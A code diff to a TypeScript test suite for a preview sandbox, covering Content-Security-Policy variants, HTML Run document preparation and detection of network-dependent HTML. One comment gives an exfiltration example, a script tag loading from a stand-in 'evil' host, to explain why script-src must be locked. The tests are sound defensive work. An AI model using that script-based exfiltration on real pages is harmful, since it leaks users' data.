@@ -1,8 +1,12 @@
 import {
   PDF_PREVIEW_CSP,
   PREVIEW_CSP,
+  PREVIEW_CSP_INLINE,
+  PREVIEW_CSP_LIVE,
   escapeForInlineJsTemplate,
+  htmlDependsOnNetwork,
   injectPreviewCsp,
+  prepareHtmlRunDocument,
   stripScripts,
 } from "@/lib/previewSandbox";
 
@@ -17,6 +21,49 @@ describe("PREVIEW_CSP", () => {
     expect(PREVIEW_CSP).toContain("sandbox allow-scripts");
   });
 
+  it("PREVIEW_CSP_INLINE keeps egress locks without meta sandbox", () => {
+    expect(PREVIEW_CSP_INLINE).toContain("connect-src 'none'");
+    expect(PREVIEW_CSP_INLINE).not.toContain("sandbox");
+    expect(PREVIEW_CSP.startsWith(PREVIEW_CSP_INLINE)).toBe(true);
+  });
+
+  it("PREVIEW_CSP_LIVE allows https subresources for HTML Run demos", () => {
+    expect(PREVIEW_CSP_LIVE).toContain("script-src 'unsafe-inline' https: http:");
+    expect(PREVIEW_CSP_LIVE).toContain("style-src 'unsafe-inline' https: http:");
+    expect(PREVIEW_CSP_LIVE).toContain("connect-src https: http:");
+    expect(PREVIEW_CSP_LIVE).toContain("form-action 'none'");
+    expect(PREVIEW_CSP_LIVE).not.toContain("sandbox");
+  });
+});
+
+describe("prepareHtmlRunDocument", () => {
+  it("injects live CSP and stay-on-page script", () => {
+    const out = prepareHtmlRunDocument(
+      "<!DOCTYPE html><html><head></head><body><h1>Hi</h1></body></html>",
+    );
+    expect(out).toContain("Content-Security-Policy");
+    expect(out).toContain("connect-src https: http:");
+    expect(out).toContain("addEventListener(\"click\"");
+    expect(out).toContain("<h1>Hi</h1>");
+  });
+});
+
+describe("htmlDependsOnNetwork", () => {
+  it("detects http(s) script/link/img and css urls", () => {
+    expect(htmlDependsOnNetwork('<script src="https://cdn.example/x.js">')).toBe(
+      true,
+    );
+    expect(htmlDependsOnNetwork('<link href="http://x/y.css" rel="stylesheet">')).toBe(
+      true,
+    );
+    expect(htmlDependsOnNetwork("body{background:url(https://x/a.png)}")).toBe(true);
+    expect(
+      htmlDependsOnNetwork("<style>h1{color:red}</style><h1>hi</h1>"),
+    ).toBe(false);
+  });
+});
+
+describe("PREVIEW_CSP egress details", () => {
   it("blocks https on script/style (external script-src exfiltration)", () => {
     // connect-src 'none' alone is not enough: <script src="https://evil/?…">
     // still fires a GET. Inline-only preview — no CDN hosts.
